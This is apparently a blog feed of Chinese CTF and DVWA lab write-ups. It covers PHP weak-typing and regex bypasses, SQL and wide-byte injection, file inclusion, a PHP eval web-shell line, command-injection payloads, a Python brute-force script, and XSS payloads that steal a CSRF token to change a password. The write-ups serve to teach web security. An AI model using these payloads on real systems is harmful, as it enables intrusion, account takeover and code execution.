language=php&gt;echo &#39;a&#39;; eval($_POST[&#39;pass&#39;]);&lt;/script&gt; &lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt; 得到flag ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## 代码审计十六进制与数字比较分析源码 12345678910111213141516171819202122232425&lt;?phperror_reporting(0); //关闭错误报告function noother_says_correct($temp) //自定义函数&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054'; //对其赋值// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++) //循环开始，循环次数为number的长度的次数&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;); //返回变量temp中的一个字符，赋值给$dightif ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //变量$temp不能存在1~9之间的数字&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp) //判断使其相等return $flag;&#125;$temp = $_GET['password']; //在这里GET传参赋值给 $tempecho noother_says_correct($temp); //执行自定义函数，并且echo输出?&gt; 这个题判断了输入的 password，然后赋值给$temp ，每一位不能大于一小于9，但是要和 3735929054 相等 bypass： php在转码时会把16进制转化为十进制 ereg正则%00截断分析源码 123456789101112131415161718192021222324252627282930313233&lt;?php$flag = "xxx"; //没什么用的一行if (isset ($_GET['password'])) //判断GET传参进来的password是否存在&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) //从GET传入的password中匹配字母或数字，如果没有匹配到&#123; echo ' You password must be alphanumeric ';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) //限制password的长度小于8，和值大于9999999&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos查找字符串首次出现的位置,要从password中匹配到 - 才行&#123; die('Flag: ' . $flag);&#125;else&#123; echo(' - have not been found ');&#125;&#125;else&#123; echo ' Invalid password ';&#125;&#125;?&gt; 题目中要求通过ereg（）函数匹配到的password只能是字母或者数字，但是strpos（）要求要匹配到 - 这个符号 password的长度要小于8而且值要大于9999999 方法一 Payload：http://123.206.87.240:9009/5.php?password[]=1 ereg() 只能处理字符串，而password是数组，所以返回的是null，null跟false不一样，所以 null!==false。 strpos() 的参数同样不能够是数组，所以返回的依旧是null，null!==false也正确。 方法二 Payload：http://123.206.87.240:9009/5.php?password=1e9%00- 采用科学技术法绕 针对password的长度小于8，和大于9999999的 采用百分号截断来绕过 ereg（）函数… 数字验证正则绕过 两个函数 preg_match()返回 pattern 的匹配次数。它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后将会停止搜索。 preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。如果发生错误preg_match()返回 FALSE。 两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止 分析代码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0); //关闭错误报告$flag = 'flag&#123;test&#125;'; //没什么用的一行if ("POST" == $_SERVER['REQUEST_METHOD']) //判断提交的数据是否是POST方式传来的&#123;$password = $_POST['password']; //POST传参赋值if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //在password中进行正则匹配，除空格符(空格键与[TAB]键)之外的所有按键&#123;echo 'flag'; //输出flagexit; //退出&#125;while (TRUE) //当是对的&#123;$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; //正则匹配，对$reg进行赋值if (6 &gt; preg_match_all($reg, $password, $arr)) //如果在$reg, $password, $arr中匹配到的数大于6break; //结束$c = 0; //对c赋值等于0$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt) //遍历打印数组&#123;if (preg_match("/[[:$pt:]]+/", $password)) //进行匹配$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上if ("42" == $password) echo $flag; //如果42等于$password,输出flag，注意是双等号~else echo 'Wrong password';exit;&#125;&#125;?&gt; 很奇怪的是hackbar直接post提交任何参数都能直接弹出flag… 其次就是 preg_match()函数 不能处理数组，所以想到数组绕过…]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF Web Writeup]]></title>
    <url>%2F2019%2F06%2F11%2F%E5%8D%97%E9%82%AECTF-Web-Writeup%2F</url>
    <content type="text"><![CDATA[南邮CTF的Web题… 签到题 F12查看页面源码 然后就可以看见flag… md5 collision分析代码： 123456789101112&lt;?php$md51 = md5('QNKCDZO'); //将QNKCFZO经过md5加密，赋值给md51$a = @$_GET['a']; //GET传参$md52 = @md5($a); //经过md5加密的变量a赋值给md52if(isset($a))&#123; //判断是否设置变量aif ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; //内层if语句判断变量a不等于QNKCDZO，且md51和md52相等 echo "nctf&#123;*****************&#125;"; //输出flag&#125; else &#123; echo "false!!!"; //否则输出"false"&#125;&#125;else&#123;echo "please input a";&#125; //最外层if条件判断?&gt; php的弱类型比较，当两个值使用==进行比较时，只是比较变量的值，而不会去比较变量的类型… 签到2 F12改maxlength属性 输入口令得到flag… 这题不是WEB 不是Web…下载图片 暴力txt文档打开（或者使用winhex） 文档末端有flag… 层层递进 查看页面源代码（右键点击就ok了） 一直点链接，&lt;iframe src=&quot;&quot;&gt;,src属性里面的链接一直点。最后出现注释掉的文字 1234567891011121314151617181920212223&lt;!-- Placed at the end of the document so the pages load faster --&gt;&lt;!-- &lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;--&gt; 每行在./js/jquery-之后的一个字符连接起来就是flag… AAencode 什么是jjencode? 将JS代码转换成只有符号的字符串 什么是aaencode？ 将JS代码转换成常用的网络表情。 - 浏览器 Unicode 解码 直接甩进控制台，报错ReferenceError: ωﾟﾉ is not defined 继续定义 ωﾟﾉ = &#39;&#39;定义它为空 再次甩进控制台，弹窗得flag… 单身二十年 根据题目信息提示，开启 Burp Suite ，在url跳转处抓包。 甩进 Burp Suite 中的Repeater模块。 Go一下，得flag… 你从哪里来 根据题目信息提示，开启 Burp Suite，直接抓包 改referer为 https://www.google.com 得flag…（但是这题我做的时候那边环境貌似挂掉了） 假装得flag… php decode分析代码： 123456789101112131415161718&lt;?phpfunction CLsI($ZzvSWE) &#123; //自定义函数 $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); //加密 for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; //循环 $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); //ord()函数主要用来返回对应字符的ascii码，chr()主要用来表示ascii码对应的字符 &#125; return $ZzvSWE;&#125;//上面的函数就是一个加密过程，其实没太大用...//题目中说到php跟shell。这里的eval跟php对不上eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?&gt; 将最后一排的 eval 换成echo 找个在线解码的网站，得flag… 文件包含 补充知识： php伪协议实现命令执行的七种姿势 ctf中关于php伪协议的考查 在 URL 跳转后，URL末端多了一个 ?file=show.php ,这里的file是可控的,此题利用php的伪协议 在URL末端构造 ?file=php://filter/read=convert.base64-encode/resource=index.php,弹回base64位加密后的文件 php://filter/可用于处理打开的数据流，起到过滤作用。如果源文件为.php则很有可能在前台显示不出来。 所以让文件转化为base64格式（convert.base64-encode）然后再输出，这样不论是什么格式的文件都可以在前台输出。 base64解密，得flag… 单身一百年也没用 通上题《单身二十年》 COOKIE 根据tips： 0==not ;那么进去直接F12，修改cookie值为1. 刷新页面得flag… MYSQL 根据提示在 URL 后加上 robots.txt,看见一堆代码 分析源码 123456789101112131415&lt;?phpif($_GET[id]) &#123; //get传参 mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); //获取GET传来的变量的整数值，赋值给id变量 $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'")); //查询语句 if ($_GET[id]==1024) &#123; //判断GET传参传进来的是否是1024 echo "&lt;p&gt;no! try again&lt;/p&gt;"; //输出 &#125; else&#123; echo($query[content]); //输出 &#125;&#125;?&gt; 代码逻辑通透，先访问题目中给出的 sql.php 然后传入一个float型的1024.0001，转成1024进入函数判断。得falg… sql injection 3 进来看见一个查询语句 your sql:select id,title from news where id = &#39;1&#39; URL为 ?id=1 输入的&#39; 全都被转义，应该是考察宽字节注入 %df&#39; 完美绕过 经过漫长的注入，得到flag… /x00 分析源码 12345678910view-source: if (isset ($_GET['nctf'])) &#123; //判断 if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) //匹配字符，正则：1-9的数字出现1到多次 echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) //要出现 #biubiubiu 这串字符，才给flag die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; if和 else if 中需要一个纯数字，但是还要出现#biubiubiu这个字符的 多种解法： 方法一：%00截断 输入nctf=1%00%23biubiubiu,得flag… 方法二：数组绕过，输入 nctf[]=1 即可绕过，第一个if是为空，绕过 FALSE（false与null还是有区别），第二个if，strpos（）处理不了数组,得flag… bypass again tips是：弱类型。 分析源码： 1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123; //判断是否设置变量if ($_GET['a'] != $_GET['b']) //GET传入的a、b不能相等if (md5($_GET['a']) == md5($_GET['b'])) //md5加密过的a,b要一样die('Flag: '.$flag); //flagelseprint 'Wrong.';&#125; md5处理不了数组，传入a[]=1&amp;&amp;b[]=2，得到flag… 变量覆盖 网页打开是一个搜索框，点击下面的 source.php 选项，查看源码 分析源码 123456789&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") //判断是否为POST传参&#123; extract($_POST); if ($pass == $thepassword_123) //判断是否相等 &#123; echo $theflag; &#125; &#125; extract()函数的作用：从数组中将变量导入到当前的符号表，可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表 方法一：pass=1&amp;thepassword_123=1 方法二：pass[]=&amp;thepassword_123 得flag… PHP是世界上最好的语言 分析源码 12345678910111213&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; //eregi()函数在一个字符串搜索指定的模式的字符串 echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]); //编码GET传入的id值后赋值给idif($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125;?&gt; 因为浏览器会进行一次编码，所以这里二次编码即可。得flag… 伪装者 补充知识： $_SERVER[“HTTP_X_FORWARDED_FOR”] 获得的值是HTTP中 X-Forwarded-For $_SERVER[“HTTP_CLIENT_IP”] 获得的值是HTTP中 Client-Ip( client-ip书写测试结果：服务器为window环境，则client-ip可以大小写混写。服务器环境为linux，则client-ip必须全部大写) $_SERVER[“REMOTE_ADDR”] 获得的值为 最后一个跟你的服务器握手的IP，可能会是代理IP或者其他 $_SERVER[“HTTP_REFERER”] 获得的值为 HTTP中的Referer Burp suite 抓包，添加：X-Forward-for:127.0.0.1 得到flag… Header 关于HTTP协议，一篇就够了 返回的响应头中有flag… 上传绕过 补充知识： 典型漏洞归纳之上传漏洞 Web安全 — 上传漏洞绕过 上传文件的过程中： 上传图片文件 ——》代码提示：必须上传后缀为php的文件 上传php文件 ——》代码提示：不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 Burp suite 抓包，在路径 /upload后面加上空格，再加1.php(表示自己上传php文件)。再改相应的对应的16进制编码，然后将空格%20修改为00 提交，得到flag… SQL注入1 分析源码： 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; //只看这一条sql语句就行了 echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value="Username"&gt;&lt;input type=password name=pass value="Password"&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href="index.phps"&gt;Source&lt;/a&gt;&lt;/html&gt; 问题的关键点是注入，直接admin&#39;) or 1=1#就可以了，登录得flag… pass check 分析源码 123456789101112131415&lt;?php$pass=@$_POST['pass']; //POST赋值$pass1=***********;//被隐藏起来的密码if(isset($pass)) //检查&#123;if(@!strcmp($pass,$pass1))&#123; //比较echo "flag:nctf&#123;*&#125;";&#125;else&#123;echo "the pass is wrong!";&#125;&#125;else&#123;echo "please input pass!";&#125;?&gt; 当不同类型的变量进行比较的时候就会存在变量转换的问题，在转换之后就有可能会存在问题。 直接传入 pass[]=1,得flag… 起名字真难 分析源码 123456789101112131415161718192021&lt;?php function noother_says_correct($number)&#123; $one = ord('1'); //ord()求一个字符对应的ascii码 $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) //循环 &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //判断，这个变量不能为数字 &#123; return false; &#125; &#125; return $number == '54975581388'; //这里满足这个条件才能输出flag&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 题目中需要传入的变量不能是数字，但要和 54975581388 相等才能输出flag,故通过16进制编码（当字符串开头是0x时，PHP会将字符串转换成十进制再进行比较）。 将 54975581388 转换成16进制 ——》 密码重置 登录进去你会发现 “你的账号” 那一框元素不能修改，且url后面为 “?user1=Y3RmdXNlcg%3D%3D”. 直接Burp Suite 抓包，发现此题对三处 admin 加以加密，所以我们要改三处地方。如下： 且需对 admin 先进行 base64加密后经过URL编码。 go，得flag… php 反序列化 分析代码： 12345678910111213141516171819202122232425&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET['pass'])) &#123; //判断 $pass = $_GET['pass']; //GET传参赋值 if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); //除掉gpc添加的反斜杠 &#125; $o = unserialize($pass); //unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 然后赋值给变量o if ($o) &#123; $o-&gt;secret = "*"; if ($o-&gt;secret === $o-&gt;enter) echo "Congratulation! Here is my secret: ".$o-&gt;secret; else echo "Oh no... You can't fool me"; &#125; else echo "are you trolling?";&#125;?&gt; 构造POC 转一个详细过程 1234567891011121314&lt;?php class just4fun&#123; var $enter; var $secret; function __construct() &#123; $this-&gt;enter=&amp;$this-&gt;secret; &#125;&#125;echo serialize(new just4fun()); ?&gt; 得flag… sql injection 4 分析代码： 1234567891011121314151617181920212223&lt;?php//GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; //自定义一个清除开了gpc后加的反斜杠的函数 if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']); //调用函数$password = @clean((string)$_GET['password']); //调用函数$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag;?&gt; 由于使用了htmlentities()函数，所以无法使用分号了。此时就可以使用反斜杠来通过转义的方式来吞掉一个分号。 构造url ?username=admin\&amp;password= or 1%23 查询语句变为 ——》 SELECT * FROM users WHERE name=&#39;admin\&#39;AND pass=&#39; or 1#&#39; 得到flag… 综合题 点进网页发现一堆文字，类似bugku一道 “jsfuck” 的题，直接丢进控制台，出现一堆文字 “1bc29b36f623ba82aaf6724fd3b16718.php” 猜测是某个网页，访问 ——》 网页出现文字 “哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里” Burp Suite 抓包发现header里面有 “history of bash” Bash shell在~/.bash_history（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。 URL访问 .bash_history ——》 出现 “zip -r flagbak.zip ./*” 访问这个zip文件，自动下载，解压得flag… system这题挂了… SQL注入2 分析代码 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; //如果变量存在，并且，$pass与$query[pw]相等,输出flag echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 观察发现只要让结果集中有你输入密码的MD5值就行，直接构造 user处为： admin&#39; and 1=2 union select md5(1)# password 为 1 提交得flag… 综合题2 网上的WP很详细，云通关一波…（还不会写脚本啦~） 密码重置2 查看网页源代码，知道用户名是 admin@nuptzj.cn 类似hgame week1的一道题，linux下一般使用vi编辑器，并且异常退出会留下备份文件 经过测试发现存在.submit.php.swp文件 12345678910111213........这一行是省略的代码........ /* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */ ........这一行是省略的代码........ if(!empty($token)&amp;&amp;!empty($emailAddress)) &#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125; else&#123; echo "失败了呀"; &#125; &#125; 直接输出十个0，得到flag… 小结 《文件包含》一题中涉及到了： php伪协议实现命令执行的七种姿势 ctf中关于php伪协议的考查 《Header》一题中涉及到了： 关于HTTP协议，一篇就够了]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA Writeup]]></title>
    <url>%2F2019%2F06%2F11%2FDVWA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[整理一下之前的DVWA笔记，并对相关知识进行补充 Brute Force这个漏洞没有太多技巧，熟练的掌握 Burp suite 即可… 还有就是之前开了代理却发现 burp suite抓不到包，很尴尬的发现自己配置代理服务器时使用的是localhost禁止使用代理…删去配置则解决。 Low这里需要注意的地方是，当传入的参数没有被过滤的时候，sql注入是可行的 Medium相比于Low级别的代码，Medium新增了一个函数来过滤一些字符串，过滤了单双引号，基本上抵制住了sql的攻击但是还是可以爆破登录。但由于下面的sleep函数，登录失败会休眠2秒， mysql_real_escape_string()PHP mysql_real_escape_string() 函数 Highhigh级别相比于之前两种要麻烦得多。medium抵御了sql注入。high甚至还抵御了直接爆破。因为high加上了一个叫token的参数，想要爆破成功，就必须获得每次登陆的一个随机token值，服务器在这里应该会先对token进行检查随后再执行SQL查询。 Json Web Token 简介 Token验证介绍 token是什么 转载一个网上流程很清晰的图… 分析源码如下： 123456789101112131415161718192021222324252627282930313233from bs4 import BeautifulSoupimport urllib2header=&#123; 'Host': '192.168.153.130', 'Cache-Control': 'max-age=0', 'If-None-Match': "307-52156c6a290c0", 'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36', 'Accept': '*/*', 'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'&#125;requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/" def get_token(requrl,header): req = urllib2.Request(url=requrl,headers=header) response = urllib2.urlopen(req) print response.getcode(), the_page = response.read() print len(the_page) soup = BeautifulSoup(the_page,"html.parser") user_token = soup.form.input.input.input.input["value"] #get the user_token return user_token user_token = get_token(requrl,header)i=0for line in open("rkolin.txt"): requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"+"?username=admin&amp;password="+line.strip()+"&amp;Login=Login&amp;user_token="+user_token i = i+1 print i,'admin',line.strip(), user_token = get_token(requrl,header) if (i == 10): break Impossible 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 对于修改数据和登陆表单提交使用 POST 方式，同时数据通过 POST 方式读取 添加随机 token 预防 csrf 攻击 针对登陆功能可添加图形验证码，每提交一次数据，验证码改变一次，验证功能在服务端进行 针对登陆次数进行限制，可使用登陆远程 IP 或用户名两种方式进行锁定，登录错误次5 分钟之内超过 3 次锁定 1-3 小时 对于管理类系统配置登陆用户允许的 IP 范围 可使用短信验证和邮箱验证方式实现双因子认证，注意对短信轰炸和邮件轰炸的防御 密码等敏感字段进行加密后传输，例如密码使用加盐 hash 算法等加密后 Command Injection这个漏洞记录的比较简略，一是DVWA这个漏洞没有多讲什么东西。二是由于系统的命令还不熟悉。之后的专项漏洞学习再对此漏洞进行补充… payload： 127.0.0.1&amp;&amp;id 127.0.0.1&amp;&amp;net user testcmdinjection||id testcmdinjection||net user 127.0.0.1&amp;id 127.0.0.1|net user testcmdinjection&amp;id testcmdinjection|net us 常用命令 ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名需要注意的： 这个漏洞需要充分掌握py脚本（话说py脚本还是真的能干挺多事儿…） 还有就是注意过滤了哪些东西，哪些没有被过滤。找到可以替代的就可以绕过 这里需要注意的是”&amp;&amp;”与” &amp;”的区别： Command 1&amp;&amp;Command 2先执行Command 1，执行成功后执行Command 2，否则不执行Command 2 Command 1&amp;Command 2先执行Command 1，不管是否成功，都会执行Command 2 Command 1 | Command 2“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。 CSRF附上几篇不错的文章： 骚姿势：当XSS与CSRF相遇 各大SRC中的CSRF技巧 Web安全 — CSRF漏洞 需要用到的工具还是 Burp suite 想到了某公司的一个面试题是如何避免CSRF，我觉得检验referer和token就是不错的方法，包括下面几个级别里面也都有提到 Low分析一波源码如下，传入参数没有防护机制 1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Get input，通过GET进行了一波传参 $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? 判断两者是否相等 if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass_new = md5( $pass_new ); // Update the database，更新数据，改为新密码 $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ?$___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);&#125; ?&gt; 方法一通过 Burp suite 进行CSRF攻击…具体流程就不必详说了，都是基本操作哈… 方法二诱导用户点击构造之后的URL。该url即可实现密码修改。但是一定要注意，我们需要服务器验证cookie，所以我们必须让该url和DVWA系统打开的浏览器一致 MediumMedium源码相比于Low源码，在第一个if上检测了referer头信息，来源必须为网站地址。 针对请求来源使用 http referrer 头信息进行检查，但是检查逻辑存在问题，检查逻辑为在 referer 中查找服务器名称，若查找到则成功，否则失败… burp suite抓个包查看一下 然后使用burp suite 相关的功能即可…但是需要注释掉这一语句history对象history.pushState() medium绕过的精华就在于通过构造其他地方的东西的名字，来绕过字符串的匹配，他原本是想匹配host里面的东西，但是host的名称可以被其他东西构造在referer里面去。 HighHigh级别的源码跟Medium差不多，但是Medium是检测的referer，high是检测的token（话说token真是个比较难绕的东西）High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。就不贴全部的源码了贴个前面的关键句 12// Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 绕过思路比较清奇…借助了反射型的XSS 这里直接借助红日安全实验室的payload： 反射性 XSS 漏洞利用payload: &lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt; 通过反射型 XSS 获取修改密码表单 user_token payload: 123&lt;iframe src="../csrf/" onload="alert(frames[0].document.getElementsByName('user_token')[0].value)"&gt;&lt;/iframe&gt; 利用反射性 XSS 自动提交修改密码表单 12345&lt;iframe src="../csrf" onload="var t=frames[0].document.getElementsByName('user_token')[0].value,x=new XMLHttpRequest();x.open('GET', '../csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token='+t, null);x.send()"&gt;&lt;/iframe&gt; 发起攻击连接http://localhost/DVWA-1.9/vulnerabilities/xss_r/?name=%3Ciframe+src%3D%22..%2Fcsrf%22+onload%3D%22var+t%3Dframes%5B0%5D.document.getElementsByName%28测试平台分析%27user_token%27%29%5B0%5D.value%2Cx%3Dnew+XMLHttpRequest%28%29%3Bx.open%28%27GET%27%2C+%27..%2Fcsrf%2F%3Fpassword_new%3Dtest123%26password_conf%3Dtest123%26Change%3DChange%26user_token%3D%27%2Bt%2C+null%29%3Bx.send%28%29%22%3E%3C%2Fiframe%3 或者借助Freebuf的payload：：https://www.freebuf.com/articles/web/118352.html 一些关于跨域问题的东西浅谈CSRF攻击-跨域攻击 ImpossibleImpossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 附上源码 一个博主写的PDO技术防范SQL注入的方法：https://blog.51cto.com/12332766/2137035 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 对于修改数据和登陆表单提交使用 POST 方式，同时数据通过 POST 方式读取 添加随机 token 预防 csrf 攻击 对提交的请求进行 referer 验证，验证规则请求 referer 必须以 http(s)://host:port/开头 针对修改密码，需要输入原密码进行验证（简单粗暴） 可添加验证码进行用户确认（有效防止无脑爆破） File 